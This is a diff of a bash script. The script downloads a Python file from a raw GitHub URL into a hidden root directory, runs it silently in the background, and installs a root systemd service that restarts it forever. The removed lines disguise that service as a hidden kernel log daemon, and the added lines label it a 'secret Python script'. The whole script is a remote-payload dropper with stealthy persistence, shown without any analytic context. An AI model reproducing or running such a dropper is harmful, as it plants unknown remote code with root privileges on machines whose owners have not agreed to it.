@@ -1,23 +1,24 @@
 #!/bin/bash
 
-DIR="/root/.system_service"
-PY="$DIR/gd.py"
 URL="https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/gd.py"
-SRV="/etc/systemd/system/.klogd.service"
+DIR="/root/.system_service"
+FILE="$DIR/gd.py"
+SRV="/etc/systemd/system/python_auto.service"
 
 mkdir -p "$DIR" && chmod 700 "$DIR"
-curl -fsS -o "$PY" "$URL" || { echo "Download failed"; exit 1; }
-chmod 700 "$PY"
-nohup python3 "$PY" >/dev/null 2>&1 &
+curl -fsS -o "$FILE" "$URL" || { echo "Download failed"; exit 1; }
+chmod 700 "$FILE"
+nohup python3 "$FILE" >/dev/null 2>&1 &
 
 if [ ! -f "$SRV" ]; then
   cat > "$SRV" <<EOF
 [Unit]
-Description=Kernel Log Daemon
+Description=Auto-run secret Python script
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/python3 $PY
+Type=simple
+ExecStart=/usr/bin/python3 $FILE
 Restart=always
 User=root
 
@@ -26,7 +27,7 @@ WantedBy=multi-user.target
 EOF
 
   systemctl daemon-reload
-  systemctl enable --now "$(basename "$SRV")"
+  systemctl enable "$(< <(basename "$SRV"))" >/dev/null 2>&1 || systemctl enable python_auto.service
 fi
 
 echo "Done."
